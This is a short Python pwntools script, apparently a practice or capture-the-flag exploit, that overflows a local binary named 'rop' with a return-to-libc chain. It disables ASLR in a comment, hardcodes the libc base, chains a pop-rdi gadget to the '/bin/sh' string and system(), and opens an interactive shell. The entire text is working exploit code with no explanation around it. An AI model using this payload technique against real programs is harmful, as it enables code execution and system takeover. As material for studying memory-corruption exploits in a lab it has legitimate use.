# echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
# ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc.so.6


from pwn import *

context.terminal = ["urxvt", "-e", "sh", "-c"]

target = process("./rop")

libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
libc.address = 0x7ffff7dd5000

p_rdi = libc.address + 0x23796

#gdb.attach(target)

buf = b"A"*0x48
buf += p64(p_rdi)
buf += p64(next(libc.search(b"/bin/sh\x00")))
buf += p64(libc.symbols["system"])

target.sendline(buf)
target.interactive()
